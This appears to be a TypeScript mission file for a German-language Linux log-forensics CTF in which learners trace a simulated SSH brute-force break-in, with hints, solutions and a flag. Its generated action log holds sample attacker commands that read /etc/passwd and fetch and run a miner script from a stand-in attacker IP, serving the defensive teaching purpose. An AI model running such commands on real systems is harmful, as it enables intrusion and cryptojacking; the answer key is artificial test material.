import type { V86Mission } from '../../lib/missions/missionTypes';
import { RESET_HOME, CHOWN_HOME, HELPERS } from './shared';

export const linuxCtfLogDetective: V86Mission = {
  nr: '04',
  id: 'linux-ctf-log-detective',
  track: 'linux',
  title: 'Log Detective',
  difficulty: 'profi',
  durationMin: 20,
  setup: `${RESET_HOME}
mkdir -p logs
t=logs/.auth.tmp
: > "$t"
i=0
while [ $i -le 22 ]; do
  case $((i % 4)) in 0) u=root;; 1) u=admin;; 2) u=test;; *) u=deploy;; esac
  printf 'Oct 14 03:%02d:%02d srv sshd[%d]: Failed password for %s from 203.0.113.45 port %d ssh2\\n' $((20 + i / 3)) $((i % 3 * 20 + 7)) $((1400 + i)) "$u" $((51000 + i * 7)) >> "$t"
  i=$((i + 1))
done
for s in 02 09 15 31; do
  printf 'Oct 14 11:02:%s srv sshd[1710]: Failed password for invalid user guest from 198.51.100.7 port 40222 ssh2\\n' "$s" >> "$t"
done
for m in 40 41 42 43 44 45; do
  printf 'Oct 14 17:%s:10 srv sshd[1990]: Failed password for pi from 192.0.2.99 port 33001 ssh2\\n' "$m" >> "$t"
done
cat >> "$t" <<'EOF'
Oct 14 08:15:02 srv sshd[1301]: Accepted password for alice from 10.0.0.5 port 50411 ssh2
Oct 14 08:15:02 srv sshd[1301]: pam_unix(sshd:session): session opened for user alice
Oct 14 09:01:44 srv sshd[1522]: Accepted password for bob from 10.0.0.8 port 50977 ssh2
Oct 14 03:28:41 srv sshd[1423]: Accepted password for deploy from 203.0.113.45 port 51190 ssh2
Oct 14 03:28:41 srv sshd[1423]: pam_unix(sshd:session): session opened for user deploy
Oct 14 12:30:00 srv sshd[1750]: Received disconnect from 10.0.0.5 port 50411
Oct 14 14:10:09 srv sshd[1801]: Accepted password for deploy from 10.0.0.12 port 52004 ssh2
EOF
sort -s -k3,3 "$t" > logs/auth.log
rm -f "$t"
cat > logs/aktionen.log <<'EOF'
Oct 14 09:20:11 srv deploy[1871]: git pull origin main
Oct 14 14:12:30 srv deploy[2043]: rc-service app restart
Oct 14 14:15:02 srv deploy[2043]: curl -O https://intranet.example/release.tar.gz
Oct 14 03:29:02 srv deploy[3310]: id
Oct 14 03:29:15 srv deploy[3310]: cat /etc/passwd
Oct 14 03:29:48 srv deploy[3310]: curl -O http://203.0.113.45/miner.sh
Oct 14 03:30:03 srv deploy[3310]: chmod +x miner.sh
Oct 14 03:30:09 srv deploy[3310]: ./miner.sh
EOF
sort -s -k3,3 -o logs/aktionen.log logs/aktionen.log
${CHOWN_HOME}`,
  steps: [
    {
      id: 'zaehlen',
      title: 'Fehlversuche zählen',
      description:
        'Ein Server wurde angegriffen. Im Verzeichnis `logs` liegt das Anmelde-Log `auth.log`. Wie viele Zeilen mit "Failed password" enthält es? Schreib die Zahl in `fehlversuche.txt`.',
      verify: `${HELPERS}fileis fehlversuche.txt "$(grep -c 'Failed password' logs/auth.log)"`,
      hints: [
        'Mit `grep` filterst du Zeilen, die ein Muster enthalten.',
        '`grep` kann die Treffer auch selbst zählen (Option mit dem Buchstaben c) oder die Ausgabe an `wc -l` übergeben.',
      ],
      solution: "grep -c 'Failed password' logs/auth.log > fehlversuche.txt",
      failMessage: 'Zähle die Zeilen mit "Failed password" in `logs/auth.log`.',
    },
    {
      id: 'angreifer',
      title: 'Angreifer-IP bestimmen',
      description:
        'Von welcher IP-Adresse kamen die meisten Fehlversuche? Schreib die Adresse in `angreifer.txt`.',
      verify: `${HELPERS}fileis angreifer.txt 203.0.113.45`,
      hints: [
        'Die IP-Adresse steht in jeder Zeile hinter dem Wort "from". Du kannst Zeilen mit `cut` oder `grep -o` auf das Wesentliche kürzen.',
        'Sortiere die Adressen (`sort`), fasse gleiche mit `uniq -c` zusammen und sortiere nach der Anzahl (`sort -n`).',
      ],
      solution:
        "grep 'Failed password' logs/auth.log | grep -oE '[0-9]+(\\.[0-9]+){3}' | sort | uniq -c | sort -n | tail -n1 | sed 's/^ *[0-9]* *//' > angreifer.txt",
      failMessage: 'Eine Adresse hat deutlich mehr Fehlversuche als alle anderen.',
    },
    {
      id: 'konto',
      title: 'Erfolgreichen Einbruch finden',
      description:
        'Die Angreifer-IP war später erfolgreich ("Accepted"). Unter welchem Benutzernamen? Schreib ihn in `konto.txt`. Achtung: Auch Berechtigte melden sich an.',
      verify: `${HELPERS}fileis konto.txt deploy`,
      hints: [
        'Filtere nach "Accepted" und nach der IP der vorigen Aufgabe. Zwei `grep`-Aufrufe lassen sich per Pipe verketten.',
        'Der Benutzername steht hinter "for".',
      ],
      solution:
        "grep Accepted logs/auth.log | grep 203.0.113.45 | sed -E 's/.* for ([^ ]+) from .*/\\1/' > konto.txt",
      failMessage: 'Gesucht ist der Benutzer der erfolgreichen Anmeldung von der Angreifer-IP.',
    },
    {
      id: 'uhrzeit',
      title: 'Zeitpunkt bestimmen',
      description:
        'Wann war der erfolgreiche Login des Angreifers? Schreib die Uhrzeit (HH:MM:SS) in `uhrzeit.txt`.',
      verify: `${HELPERS}fileis uhrzeit.txt 03:28:41`,
      hints: [
        'Die Zeile aus dem letzten Schritt beginnt mit Datum und Uhrzeit.',
        'Nimm genau die Uhrzeit, nicht das Datum.',
      ],
      solution: "grep Accepted logs/auth.log | grep 203.0.113.45 | cut -d' ' -f3 > uhrzeit.txt",
      failMessage: 'Die Uhrzeit steht am Anfang der Zeile mit dem erfolgreichen Login.',
    },
    {
      id: 'datei',
      title: 'Nachladen nachweisen',
      description:
        'Nach dem Einbruch hat der Angreifer etwas von seinem eigenen Server (seine IP) geladen. Das steht in `logs/aktionen.log`. Schreib nur den Dateinamen in `datei.txt`.',
      verify: `${HELPERS}fileis datei.txt miner.sh`,
      hints: [
        'Suche in `logs/aktionen.log` nach der IP des Angreifers.',
        'Der Dateiname steht am Ende der URL. Es gibt auch einen harmlosen Download, der nicht von der Angreifer-IP kommt.',
      ],
      solution: "grep 203.0.113.45 logs/aktionen.log | sed 's|.*/||' > datei.txt",
      failMessage: 'Gesucht ist die Datei, die von der Angreifer-IP geladen wurde.',
    },
  ],
  flag: `set -eo pipefail
a=$(tr -d '[:space:]' < angreifer.txt | tr . -)
k=$(tr -d '[:space:]' < konto.txt)
d=$(tr -d '[:space:]' < datei.txt | tr . -)
printf 'FLAG{%s_%s_%s}\\n' "$a" "$k" "$d"`,
};
